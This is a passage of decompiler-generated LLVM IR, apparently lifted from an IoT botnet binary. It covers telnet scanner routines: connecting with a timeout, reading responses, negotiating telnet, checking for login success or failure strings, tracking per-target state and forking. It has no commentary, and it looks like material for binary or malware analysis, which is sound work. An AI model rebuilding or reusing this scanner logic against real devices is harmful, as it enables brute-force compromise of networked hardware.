  %v2_9740 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9754.lr.ph, %dec_label_pc_9754
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9754.lr.ph ], [ %v1_9768, %dec_label_pc_9754 ]
  %v5_9760 = mul nuw nsw i32 %storemerge628, 4
  %v6_9760 = add i32 %v5_9760, %v2_9740
  %v7_9760 = inttoptr i32 %v6_9760 to i32*
  store i32 0, i32* %v7_9760, align 4
  %v1_9768 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9768, 32
  br i1 %tmp53, label %dec_label_pc_9754, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9754
  %v13_9704 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9780 = udiv i32 %arg1, 32
  %v3_978c = mul nuw nsw i32 %v3_9780, 4
  %v2_9794 = add nsw i32 %v3_978c, -160
  %v2_9798 = add i32 %v2_9794, %v13_9704
  %v1_979c = inttoptr i32 %v2_9798 to i32*
  %v2_979c = load i32, i32* %v1_979c, align 4
  %v1_97a4 = urem i32 %arg1, 32
  %v6_97ac = shl i32 1, %v1_97a4
  %v2_97b0 = or i32 %v2_979c, %v6_97ac
  store i32 %v2_97b0, i32* %v1_979c, align 4
  %v1_97d0 = add i32 %arg1, 1
  %v2_97dc = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_97f0 = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_9804 = icmp sgt i32 %v5_97f0, 0
  br i1 %v5_9804, label %dec_label_pc_9998.preheader, label %dec_label_pc_9904.preheader

dec_label_pc_9904.preheader:                      ; preds = %dec_label_pc_977c
  %v7_990c24 = icmp slt i32 %tmp34, 10
  br i1 %v7_990c24, label %dec_label_pc_9844.lr.ph, label %dec_label_pc_9998.preheader

dec_label_pc_9844.lr.ph:                          ; preds = %dec_label_pc_9904.preheader, %dec_label_pc_98f8
  %stack_var_-44.025 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %tmp34, %dec_label_pc_9904.preheader ]
  %v2_9810 = load i32, i32* @global_var_27918.46, align 4
  %v3_981c = call i32 @Rootsprintf(i32 %v2_9810, i32 ptrtoint ([5 x i8]* @global_var_1cba8.48 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9844

dec_label_pc_9844:                                ; preds = %dec_label_pc_9844.lr.ph, %dec_label_pc_9844
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9844.lr.ph ], [ %v1_9858, %dec_label_pc_9844 ]
  %v5_9850 = mul nuw nsw i32 %storemerge716, 4
  %v6_9850 = add i32 %v5_9850, %v2_9740
  %v7_9850 = inttoptr i32 %v6_9850 to i32*
  store i32 0, i32* %v7_9850, align 4
  %v1_9858 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9858, 32
  br i1 %tmp54, label %dec_label_pc_9844, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_9844
  %v2_988c = load i32, i32* %v1_979c, align 4
  %v2_98a0 = or i32 %v2_988c, %v6_97ac
  store i32 %v2_98a0, i32* %v1_979c, align 4
  store i32 0, i32* @r2, align 4
  %v5_98e0 = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_98f4 = icmp sgt i32 %v5_98e0, 0
  br i1 %v5_98f4, label %dec_label_pc_9998.preheader, label %dec_label_pc_98f8

dec_label_pc_98f8:                                ; preds = %dec_label_pc_986c
  %v1_98fc = add nsw i32 %stack_var_-44.025, 1
  %v7_990c = icmp slt i32 %v1_98fc, 10
  br i1 %v7_990c, label %dec_label_pc_9844.lr.ph, label %dec_label_pc_9998.preheader

dec_label_pc_9998.preheader:                      ; preds = %dec_label_pc_98f8, %dec_label_pc_986c, %dec_label_pc_9904.preheader, %dec_label_pc_977c
  %v2_992c = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_99a058 = icmp sgt i32 %arg3, 1
  %v2_99b860 = icmp eq i1 %not.v7_99a058, false
  br i1 %v2_99b860, label %dec_label_pc_99c0, label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9998.preheader, %dec_label_pc_998c
  %v1_999c63.in = phi i32 [ %v1_999c63, %dec_label_pc_998c ], [ %arg3, %dec_label_pc_9998.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_997c, %dec_label_pc_998c ], [ %arg2, %dec_label_pc_9998.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_9990, %dec_label_pc_998c ], [ 0, %dec_label_pc_9998.preheader ]
  %v1_999c63 = add i32 %v1_999c63.in, -1
  %v2_9928 = load i32, i32* @global_var_27918.46, align 4
  %v5_9940 = call i32 @__libc_recv(i32 %v2_9928, i32 %v2_992c, i32 1, i32 0, i32 %v1_999c63)
  %v7_9948 = icmp eq i32 %v5_9940, 1
  br i1 %v7_9948, label %dec_label_pc_9968, label %dec_label_pc_9950

dec_label_pc_9950:                                ; preds = %dec_label_pc_9924
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_99d4

dec_label_pc_9968:                                ; preds = %dec_label_pc_9924
  %v3_9968 = load i8, i8* %stack_var_-185, align 1
  %v4_996c = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9968, i8* %stack_var_-40.062, align 1
  %v1_9978 = add i32 %v4_996c, 1
  %v5_997c = inttoptr i32 %v1_9978 to i8*
  %v3_9980 = load i8, i8* %stack_var_-185, align 1
  %v7_9984 = icmp eq i8 %v3_9980, 10
  br i1 %v7_9984, label %dec_label_pc_99c0, label %dec_label_pc_998c

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %stack_var_-36.061, 1
  %not.v7_99a0 = icmp sgt i32 %v1_999c63, 1
  %v2_99b8 = icmp eq i1 %not.v7_99a0, false
  br i1 %v2_99b8, label %dec_label_pc_99c0, label %dec_label_pc_9924

dec_label_pc_99c0:                                ; preds = %dec_label_pc_9968, %dec_label_pc_998c, %dec_label_pc_9998.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9998.preheader ], [ %v1_9990, %dec_label_pc_998c ], [ %stack_var_-36.061, %dec_label_pc_9968 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9998.preheader ], [ %v5_997c, %dec_label_pc_998c ], [ %v5_997c, %dec_label_pc_9968 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_99d4

dec_label_pc_99d4:                                ; preds = %dec_label_pc_9950, %dec_label_pc_99c0
  %storemerge = phi i32 [ -1, %dec_label_pc_9950 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_99c0 ]
  %v2_99e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_99e0, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_999c63, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_98fc, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9740, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_99d4, { 1, 0 }
  uselistorder label %dec_label_pc_99c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9844, { 1, 0 }
  uselistorder label %dec_label_pc_9844.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9754, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_99f4 = load i32, i32* @fp, align 4
  store i32 39420, i32* %stack_var_-4, align 4
  %v2_99f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_99f8, i32* @fp, align 4
  %v1_9a08 = add i32 %arg1, 4
  %v2_9a08 = inttoptr i32 %v1_9a08 to i32*
  %v3_9a08 = load i32, i32* %v2_9a08, align 4
  store i32 %v3_9a08, i32* @r0, align 4
  %v1_9a14 = call i32 @__GI_inet_ntoa(i32 %v3_9a08)
  store i32 %v3_99f4, i32* @fp, align 4
  ret i32 %v1_9a14

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9a30 = load i32, i32* @fp, align 4
  store i32 39480, i32* %stack_var_-4, align 4
  %v2_9a34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a34, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9a5c = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9a70 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9a80 = load i8, i8* %arg3, align 1
  %v2_9a84 = icmp eq i8 %v2_9a80, -1
  br i1 %v2_9a84, label %dec_label_pc_9a8c, label %dec_label_pc_9a9c

dec_label_pc_9a8c:                                ; preds = %entry
  %v3_9a80 = zext i8 %v2_9a80 to i32
  %v6_9a98 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9a80, i32 %v5_9a70)
  br label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %entry, %dec_label_pc_9a8c
  %v3_9aa0 = load i32, i32* %stack_var_0, align 4
  %v3_9aa4 = call i32 @contains_string(i32 %tmp, i32 %v3_9aa0)
  %v2_9aac = icmp ne i32 %v3_9aa4, 0
  %. = zext i1 %v2_9aac to i32
  store i32 %v3_9a30, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9a80, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9a9c, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9b20.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9ae0 = load i32, i32* @fp, align 4
  store i32 %v3_9ae0, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9b0c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.lr.ph, %dec_label_pc_9b20
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9b20.lr.ph ], [ %v1_9b34, %dec_label_pc_9b20 ]
  %v5_9b2c = mul nuw nsw i32 %storemerge25, 4
  %v6_9b2c = add i32 %v5_9b2c, %v2_9b0c
  %v7_9b2c = inttoptr i32 %v6_9b2c to i32*
  store i32 0, i32* %v7_9b2c, align 4
  %v1_9b34 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9b34, 32
  br i1 %tmp21, label %dec_label_pc_9b20, label %dec_label_pc_9b48

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9b20
  %v13_9ae0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9b4c = udiv i32 %arg1, 32
  %v3_9b58 = mul nuw nsw i32 %v3_9b4c, 4
  %v2_9b60 = add nsw i32 %v3_9b58, -136
  %v2_9b64 = add i32 %v2_9b60, %v13_9ae0
  %v1_9b68 = inttoptr i32 %v2_9b64 to i32*
  %v2_9b68 = load i32, i32* %v1_9b68, align 4
  %v1_9b70 = urem i32 %arg1, 32
  %v6_9b78 = shl i32 1, %v1_9b70
  %v2_9b7c = or i32 %v2_9b68, %v6_9b78
  store i32 %v2_9b7c, i32* %v1_9b68, align 4
  %v1_9b9c = add i32 %arg1, 1
  %v2_9ba4 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9bb8 = call i32 @__libc_select(i32 %v1_9b9c, i32 %v2_9b0c, i32 0, i32 0, i32 %v2_9ba4)
  %v5_9bc4 = icmp sgt i32 %v5_9bb8, 0
  br i1 %v5_9bc4, label %dec_label_pc_9bd4, label %dec_label_pc_9bc8

dec_label_pc_9bc8:                                ; preds = %dec_label_pc_9b48
  br label %dec_label_pc_9bf4

dec_label_pc_9bd4:                                ; preds = %dec_label_pc_9b48
  %v5_9be8 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bc8, %dec_label_pc_9bd4
  %storemerge = phi i32 [ %v5_9be8, %dec_label_pc_9bd4 ], [ 0, %dec_label_pc_9bc8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9b0c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9bf4, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9c24 = icmp eq i32 %arg2, 0
  br i1 %v2_9c24, label %dec_label_pc_9c2c, label %dec_label_pc_9c3c

dec_label_pc_9c2c:                                ; preds = %entry
  %v2_9c30 = load i32, i32* %arg1, align 4
  %v1_9c38 = call i32 @__GI_close(i32 %v2_9c30)
  br label %dec_label_pc_9c3c

dec_label_pc_9c3c:                                ; preds = %entry, %dec_label_pc_9c2c
  %v2_9c44 = add i32 %tmp, 16
  %v3_9c44 = inttoptr i32 %v2_9c44 to i32*
  store i32 0, i32* %v3_9c44, align 4
  %v3_9c48 = load i32, i32* %stack_var_-24, align 4
  %v1_9c54 = trunc i32 %v3_9c48 to i8
  %v3_9c54 = add i32 %tmp, 8
  %v4_9c54 = inttoptr i32 %v3_9c54 to i8*
  store i8 %v1_9c54, i8* %v4_9c54, align 1
  %v1_9c5c = add i32 %tmp, 24
  %v2_9c5c = inttoptr i32 %v1_9c5c to i32*
  %v3_9c5c = load i32, i32* %v2_9c5c, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9c6c = inttoptr i32 %v3_9c5c to i8*
  %v3_9c6c = call i32 @__GI_memset(i8* %v2_9c6c, i32 0)
  ret i32 %v3_9c6c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9c3c, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c80 = load i32, i32* @fp, align 4
  %v2_9c98 = inttoptr i32 %arg1 to i32*
  %v3_9c98 = call i32 @advance_state(i32* %v2_9c98, i32 0)
  %v3_9ca4 = add i32 %arg1, 9
  %v4_9ca4 = inttoptr i32 %v3_9ca4 to i8*
  store i8 1, i8* %v4_9ca4, align 1
  store i32 %v3_9c80, i32* @fp, align 4
  ret i32 %v3_9c98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9cb8 = load i32, i32* @fp, align 4
  %v3_9cd0 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_27654.53 to i32))
  store i32 %v3_9cb8, i32* @fp, align 4
  ret i32 %v3_9cd0
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9cf0 = load i32, i32* @fp, align 4
  %v3_9d08 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_27634.62 to i32))
  store i32 %v3_9cf0, i32* @fp, align 4
  ret i32 %v3_9d08

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40240, i32* %stack_var_-4, align 4
  %v2_9d2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d2c, i32* @fp, align 4
  %v1_9d3c = call i32 @contains_success(i32 %arg1)
  %v2_9d44 = icmp eq i32 %v1_9d3c, 0
  br i1 %v2_9d44, label %dec_label_pc_9d4c, label %dec_label_pc_9d74

dec_label_pc_9d4c:                                ; preds = %entry
  %v1_9d50 = call i32 @contains_fail(i32 %arg1)
  %v2_9d58 = icmp ne i32 %v1_9d50, 0
  %. = zext i1 %v2_9d58 to i32
  br label %dec_label_pc_9d74

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9d4c, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9d4c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9db8, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9dbc, %dec_label_pc_9db8 ]
  %v1_9dbc = add i32 %stack_var_-24.0, 1
  %v3_9dc8 = mul i32 %v1_9dbc, 4
  %v2_9dd4 = add i32 %v3_9dc8, %arg2
  %v1_9dd8 = inttoptr i32 %v2_9dd4 to i32*
  %v2_9dd8 = load i32, i32* %v1_9dd8, align 4
  %v2_9ddc = icmp eq i32 %v2_9dd8, 0
  br i1 %v2_9ddc, label %dec_label_pc_9e38.preheader, label %dec_label_pc_9db8

dec_label_pc_9e38.preheader:                      ; preds = %dec_label_pc_9db8
  %v3_9e10 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9e38

dec_label_pc_9df0:                                ; preds = %dec_label_pc_9e38
  %v3_9df4 = mul i32 %storemerge2, 4
  %v2_9e00 = add i32 %v3_9df4, %arg2
  %v1_9e04 = inttoptr i32 %v2_9e00 to i32*
  %v2_9e04 = load i32, i32* %v1_9e04, align 4
  %v4_9e10 = call i32 @strcasestr(i8* %v3_9e10, i32 %v2_9e04, i32 %v3_9df4)
  %v2_9e18 = icmp eq i32 %v4_9e10, 0
  %v1_9e30 = add nuw i32 %storemerge2, 1
  br i1 %v2_9e18, label %dec_label_pc_9e38, label %dec_label_pc_9e50

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9df0, %dec_label_pc_9e38.preheader
  %storemerge2 = phi i32 [ %v1_9e30, %dec_label_pc_9df0 ], [ 0, %dec_label_pc_9e38.preheader ]
  %v5_9e44 = icmp slt i32 %storemerge2, %v1_9dbc
  br i1 %v5_9e44, label %dec_label_pc_9df0, label %dec_label_pc_9e50

dec_label_pc_9e50:                                ; preds = %dec_label_pc_9e38, %dec_label_pc_9df0
  %storemerge = phi i32 [ 1, %dec_label_pc_9df0 ], [ 0, %dec_label_pc_9e38 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9dbc, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e68 = load i32, i32* @fp, align 4
  store i32 %v3_9e68, i32* %stack_var_-16, align 4
  %v13_9e68 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9e90 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9ea0 = or i32 %v2_9e90, 2048
  store i32 %v1_9ea0, i32* @r3, align 4
  %v2_9eb4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9ec8 = urem i32 %arg3, 65536
  %v1_9ed0 = call i32 @__GI_htons(i32 %v3_9ec8)
  %v3_9ef0 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9ef8 = icmp eq i32 %v3_9ef0, 0
  br i1 %v2_9ef8, label %dec_label_pc_9f0c, label %dec_label_pc_9f00

dec_label_pc_9f00:                                ; preds = %entry
  br label %dec_label_pc_a0c4

dec_label_pc_9f0c:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9f20 = bitcast i32* %stack_var_-40 to i8*
  %v3_9f20 = call i32 @__GI_memset(i8* %v2_9f20, i32 0)
  %v2_9f24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9f34 = call i32 @__libc_connect(i32 %arg1, i32 %v2_9f24, i32 16)
  store i32 %v3_9f34, i32* @r3, align 4
  %v1_9f44 = icmp slt i32 %v3_9f34, 0
  br i1 %v1_9f44, label %dec_label_pc_9f4c, label %dec_label_pc_a088

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f0c
  %v0_9f4c = call i32 @__GI___errno_location()
  %v1_9f54 = inttoptr i32 %v0_9f4c to i32*
  %v2_9f54 = load i32, i32* %v1_9f54, align 4
  %v7_9f58 = icmp eq i32 %v2_9f54, 115
  br i1 %v7_9f58, label %dec_label_pc_9f84.lr.ph, label %dec_label_pc_a07c

dec_label_pc_9f84.lr.ph:                          ; preds = %dec_label_pc_9f4c
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f70 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f84

dec_label_pc_9f84:                                ; preds = %dec_label_pc_9f84.lr.ph, %dec_label_pc_9f84
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f84.lr.ph ], [ %v1_9f98, %dec_label_pc_9f84 ]
  %v5_9f90 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f90 = add i32 %v5_9f90, %v2_9f70
  %v7_9f90 = inttoptr i32 %v6_9f90 to i32*
  store i32 0, i32* %v7_9f90, align 4
  %v1_9f98 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f98, 32
  br i1 %tmp28, label %dec_label_pc_9f84, label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f84
  %v3_9fb0 = udiv i32 %arg1, 32
  %v3_9fbc = mul nuw nsw i32 %v3_9fb0, 4
  %v2_9fc4 = add nsw i32 %v3_9fbc, -160
  %v2_9fc8 = add i32 %v2_9fc4, %v13_9e68
  %v1_9fcc = inttoptr i32 %v2_9fc8 to i32*
  %v2_9fcc = load i32, i32* %v1_9fcc, align 4
  %v1_9fd4 = urem i32 %arg1, 32
  %v6_9fdc = shl i32 1, %v1_9fd4
  %v2_9fe0 = or i32 %v2_9fcc, %v6_9fdc
  store i32 %v2_9fe0, i32* %v1_9fcc, align 4
  %v1_a000 = add i32 %arg1, 1
  %v2_a008 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a020 = call i32 @__libc_select(i32 %v1_a000, i32 0, i32 %v2_9f70, i32 0, i32 %v2_a008)
  %tmp29 = icmp slt i32 %v5_a020, 1
  br i1 %tmp29, label %dec_label_pc_a070, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %dec_label_pc_9fac
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a038 = ptrtoint i32* %stack_var_-192 to i32
  %v2_a03c = ptrtoint i32* %stack_var_-188 to i32
  %v5_a054 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a038, i32 %v2_a03c)
  %v3_a058 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a058, i32* @r3, align 4
  %v2_a05c = icmp eq i32 %v3_a058, 0
  br i1 %v2_a05c, label %dec_label_pc_a088, label %dec_label_pc_a064

dec_label_pc_a064:                                ; preds = %dec_label_pc_a030
  br label %dec_label_pc_a0c4

dec_label_pc_a070:                                ; preds = %dec_label_pc_9fac
  br label %dec_label_pc_a0c4

dec_label_pc_a07c:                                ; preds = %dec_label_pc_9f4c
  br label %dec_label_pc_a0c4

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f0c, %dec_label_pc_a030
  %v2_a094 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0a4 = and i32 %v2_a094, -2049
  store i32 %v1_a0a4, i32* @r3, align 4
  %v2_a0b8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a0c4

dec_label_pc_a0c4:                                ; preds = %dec_label_pc_a07c, %dec_label_pc_a070, %dec_label_pc_a064, %dec_label_pc_9f00, %dec_label_pc_a088
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a070 ], [ 1, %dec_label_pc_a088 ], [ 0, %dec_label_pc_a064 ], [ 0, %dec_label_pc_a07c ], [ 0, %dec_label_pc_9f00 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f70, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a0c4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a088, { 1, 0 }
  uselistorder label %dec_label_pc_9f84, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a0dc = load i32, i32* @r4, align 4
  %v6_a0dc = load i32, i32* @r5, align 4
  %v9_a0dc = load i32, i32* @r6, align 4
  %v12_a0dc = load i32, i32* @fp, align 4
  store i32 41188, i32* %stack_var_-4, align 4
  %v2_a0e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a0e0, i32* @fp, align 4
  %v0_a0e8 = call i32 @__libc_fork()
  %v2_a0f8 = icmp eq i32 %v0_a0e8, 0
  br i1 %v2_a0f8, label %dec_label_pc_a264, label %dec_label_pc_a10c

dec_label_pc_a10c:                                ; preds = %entry
  %v2_a110 = load i32, i32* @global_var_27920.64, align 4
  %v5_a110 = load i32, i32* @global_var_27924.65, align 4
  %v2_a11c = add i32 %v2_a110, 1
  %v3_a11c = icmp eq i32 %v2_a11c, 0
  %v4_a120 = zext i1 %v3_a11c to i32
  %v5_a120 = add i32 %v4_a120, %v5_a110
  store i32 %v2_a11c, i32* @global_var_27920.64, align 4
  store i32 %v5_a120, i32* @global_var_27924.65, align 4
  %v2_a13c = add i32 %v2_a110, 2
  %v3_a13c = icmp eq i32 %v2_a11c, -1
  %v4_a140 = zext i1 %v3_a13c to i32
  %v5_a140 = add i32 %v5_a120, %v4_a140
  %v3_a144 = udiv i32 %v2_a13c, 1073741824
  %v3_a148 = mul i32 %v5_a140, 4
  %v2_a14c = or i32 %v3_a148, %v3_a144
  store i32 %v2_a14c, i32* @r4, align 4
  %v3_a150 = mul i32 %v2_a13c, 4
  %v1_a158 = call i32 @malloc(i32 %v3_a150)
  br label %dec_label_pc_a1b0

dec_label_pc_a170:                                ; preds = %dec_label_pc_a1b0, %dec_label_pc_a1fc
  %v3_a174 = mul i32 %storemerge2, 4
  %v2_a180 = add i32 %v3_a174, %v1_a158
  %v2_a194 = load i32, i32* @global_var_2db88.67, align 4
  %v2_a198 = add i32 %v2_a194, %v3_a174
  %v1_a19c = inttoptr i32 %v2_a198 to i32*
  %v2_a19c = load i32, i32* %v1_a19c, align 4
  %v2_a1a0 = inttoptr i32 %v2_a180 to i32*
  store i32 %v2_a19c, i32* %v2_a1a0, align 4
  %v1_a1a8 = add i32 %storemerge2, 1
  br label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a10c, %dec_label_pc_a170
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a10c ], [ %v1_a1a8, %dec_label_pc_a170 ]
  %v2_a1c8 = load i32, i32* @global_var_27920.64, align 4
  %v5_a1c8 = load i32, i32* @global_var_27924.65, align 4
  %v2_a1dc = add i32 %v2_a1c8, -1
  %v3_a1dc = icmp ne i32 %v2_a1c8, 0
  %v3_a1e0 = add i32 %v5_a1c8, -1
  %v5_a1e0 = sext i1 %v3_a1dc to i32
  %v9_a1f4 = icmp eq i32 %v3_a1e0, %v5_a1e0
  br i1 %v9_a1f4, label %dec_label_pc_a1fc, label %dec_label_pc_a170

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1b0
  store i32 %v2_a1dc, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a1dc, %storemerge2
  br i1 %tmp, label %dec_label_pc_a170, label %dec_label_pc_a21c

